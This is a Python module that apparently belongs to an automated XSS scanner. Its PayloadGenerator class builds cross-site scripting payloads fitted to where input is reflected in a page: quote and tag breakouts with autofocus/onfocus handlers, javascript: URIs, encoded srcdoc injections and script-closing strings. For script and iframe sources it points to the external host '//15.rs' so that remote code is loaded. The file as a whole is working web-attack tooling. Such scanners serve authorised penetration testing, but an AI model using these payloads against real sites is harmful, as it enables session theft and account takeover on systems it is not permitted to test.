from typing import Dict, Set, List, Optional, Any
from core.config import (
    ScanContext, xsschecker, badTags, fillings, eFillings, 
    lFillings, jFillings, eventHandlers, tags, functions
)
from core.jsContexter import jsContexter
from core.utils import randomUpper as r, genGen, extractScripts

class PayloadGenerator:
    def __init__(self, context: ScanContext):
        self.context = context

    def generate(self, occurences: Dict[int, Any], response_text: str) -> Dict[int, Set[str]]:
        """
        Generates XSS payloads based on the context of reflections found in the response.
        """
        scripts = extractScripts(response_text)
        index = 0
        vectors: Dict[int, Set[str]] = {i: set() for i in range(1, 12)}
        
        for i in occurences:
            context = occurences[i]['context']
            details = occurences[i].get('details', {})
            score = occurences[i].get('score', {})

            if context == 'html':
                self._generate_html_context(vectors, score, details)
            
            elif context == 'attribute':
                self._generate_attribute_context(vectors, score, details, index, scripts)
            
            elif context == 'comment':
                self._generate_comment_context(vectors, score)
            
            elif context == 'script':
                self._generate_script_context(vectors, score, details, index, scripts)
                index += 1
                
        return vectors

    def _generate_html_context(self, vectors: Dict[int, Set[str]], score: Dict[str, int], details: Dict[str, Any]):
        less_bracket_eff = score.get('<', 0)
        great_bracket_eff = score.get('>', 0)
        ends = ['//']
        bad_tag = details.get('badTag', '')
        
        if great_bracket_eff == 100:
            ends.append('>')
        
        if less_bracket_eff:
            payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends, bad_tag)
            for payload in payloads:
                vectors[10].add(payload)

    def _generate_attribute_context(self, vectors: Dict[int, Set[str]], score: Dict[str, int], details: Dict[str, Any], index: int, scripts: List[str]):
        tag = details.get('tag')
        attr_type = details.get('type')
        quote = details.get('quote', '') or ''
        attr_name = details.get('name', '')
        attr_value = details.get('value', '')
        
        quote_eff = score.get(quote, 100) if quote in score else 100
        great_bracket_eff = score.get('>', 0)
        ends = ['//']
        
        if great_bracket_eff == 100:
            ends.append('>')
            
        if great_bracket_eff == 100 and quote_eff == 100:
            payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
            for payload in payloads:
                vectors[9].add(quote + '>' + payload)
                
        if quote_eff == 100:
            for filling in fillings:
                for function in functions:
                    vector = quote + filling + r('autofocus') + filling + r('onfocus') + '=' + quote + function
                    vectors[8].add(vector)
                    
        if quote_eff == 90:
            for filling in fillings:
                for function in functions:
                    vector = '\\' + quote + filling + r('autofocus') + filling + r('onfocus') + '=' + function + filling + '\\' + quote
                    vectors[7].add(vector)
                    
        if attr_type == 'value':
            self._handle_value_attribute(vectors, score, details, attr_name, attr_value, tag, quote, quote_eff, great_bracket_eff, ends)

    def _handle_value_attribute(self, vectors, score, details, attr_name, attr_value, tag, quote, quote_eff, great_bracket_eff, ends):
        if attr_name == 'srcdoc':
            if score.get('&lt;'):
                if score.get('&gt;'):
                    ends = ['%26gt;']
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[9].add(payload.replace('<', '%26lt;'))
        
        elif attr_name == 'href' and attr_value == xsschecker:
            for function in functions:
                vectors[10].add(r('javascript:') + function)
        
        elif attr_name.startswith('on'):
            closer = jsContexter(attr_value)
            found_quote = ''
            parts = attr_value.split(xsschecker)
            if len(parts) > 1:
                for char in parts[1]:
                    if char in ['\'', '"', '`']:
                        found_quote = char
                        break
            suffix = '//\\'
            for filling in jFillings:
                for function in functions:
                    vector = found_quote + closer + filling + function + suffix
                    vectors[9].add(vector)
            
            if quote_eff > 83:
                suffix = '//'
                for filling in jFillings:
                    for function in functions:
                        if '=' in function:
                            function = '(' + function + ')'
                        if found_quote == '':
                            filling = ''
                        vector = '\\' + found_quote + closer + filling + function + suffix
                        vectors[7].add(vector)
                        
        elif tag in ('script', 'iframe', 'embed', 'object'):
            if attr_name in ('src', 'iframe', 'embed') and attr_value == xsschecker:
                for payload in ['//15.rs', '\\/\\\\\\/\\15.rs']:
                    vectors[10].add(payload)
            elif tag == 'object' and attr_name == 'data' and attr_value == xsschecker:
                for function in functions:
                    vectors[10].add(r('javascript:') + function)
            elif quote_eff == great_bracket_eff == 100:
                payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
                for payload in payloads:
                    vectors[11].add(quote + '>' + r('</script/>') + payload)

    def _generate_comment_context(self, vectors: Dict[int, Set[str]], score: Dict[str, int]):
        less_bracket_eff = score.get('<', 0)
        great_bracket_eff = score.get('>', 0)
        ends = ['//']
        if great_bracket_eff == 100:
            ends.append('>')
        if less_bracket_eff == 100:
            payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
            for payload in payloads:
                vectors[10].add(payload)

    def _generate_script_context(self, vectors: Dict[int, Set[str]], score: Dict[str, int], details: Dict[str, Any], index: int, scripts: List[str]):
        if not scripts:
            return
            
        try:
            script = scripts[index]
        except IndexError:
            script = scripts[0]
            
        closer = jsContexter(script)
        quote = details.get('quote', '')
        script_eff = score.get('</scRipT/>', 0)
        great_bracket_eff = score.get('>', 0)
        breaker_eff = score.get(quote, 100) if quote else 100
        ends = ['//']
        
        if great_bracket_eff == 100:
            ends.append('>')
            
        if script_eff == 100:
            payloads = genGen(fillings, eFillings, lFillings, eventHandlers, tags, functions, ends)
            for payload in payloads:
                vectors[10].add(payload)
                
        if closer:
            suffix = '//\\'
            for filling in jFillings:
                for function in functions:
                    vector = quote + closer + filling + function + suffix
                    vectors[7].add(vector)
        elif breaker_eff > 83:
            prefix = '\\' if breaker_eff != 100 else ''
            suffix = '//'
            for filling in jFillings:
                for function in functions:
                    if '=' in function:
                        function = '(' + function + ')'
                    if quote == '':
                        filling = ''
                    vector = prefix + quote + closer + filling + function + suffix
                    vectors[6].add(vector)
